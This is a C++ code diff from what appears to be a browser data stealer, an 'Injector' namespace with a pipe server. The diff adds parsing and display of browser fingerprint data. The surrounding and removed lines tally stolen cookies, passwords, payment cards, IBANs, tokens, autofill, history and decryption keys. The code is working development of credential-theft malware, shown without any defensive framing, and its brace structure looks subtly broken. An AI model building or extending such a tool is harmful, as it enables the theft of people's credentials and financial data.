@@ -325,6 +325,23 @@ namespace Injector {
                         console.DisplayHistory(url, title, std::stoi(visitCount), lastVisitTime);
                     }
                 }
+                // NEW: Fingerprint parsing
+                else if (msg.rfind("FINGERPRINT_START:", 0) == 0) {
+                    std::string browser = msg.substr(18);
+                    console.BrowserHeader(browser + " Fingerprint");
+                    console.ProfileHeader("Metadata");
+                }
+                else if (msg.rfind("FINGERPRINT:", 0) == 0) {
+                    int count = std::stoi(msg.substr(12));
+                    console.ExtractionResult("Fingerprint", count);
+                }
+                else if (msg.rfind("FINGERPRINT_DATA:", 0) == 0) {
+                    std::string data = msg.substr(17);
+                    size_t sep = data.find('|');
+                    if (sep != std::string::npos) {
+                        console.DataRow(data.substr(0, sep), data.substr(sep + 1));
+                    }
+                }
                 else if (msg.rfind("[-]", 0) == 0) {
                     console.Error(msg.substr(4));
                 }
@@ -342,15 +359,10 @@ namespace Injector {
 
         // Show key summary after processing all messages
         if (m_stats.hasAppKey || m_stats.hasOsKey) {
+            console.Debug("");
             console.KeySummary(m_stats.hasAppKey, m_stats.hasOsKey);
         }
-
-        // Show final summary with all data types
-        console.Summary(m_stats.cookies, m_stats.passwords, m_stats.cards, 
-                       m_stats.ibans, m_stats.tokens, m_stats.autofill, 
-                       m_stats.history, m_stats.profiles, "Output saved to disk");
-    }
-
+}
     std::wstring PipeServer::GenerateName(const std::wstring& browserType) {
         DWORD pid = GetCurrentProcessId();
         DWORD tid = GetCurrentThreadId();
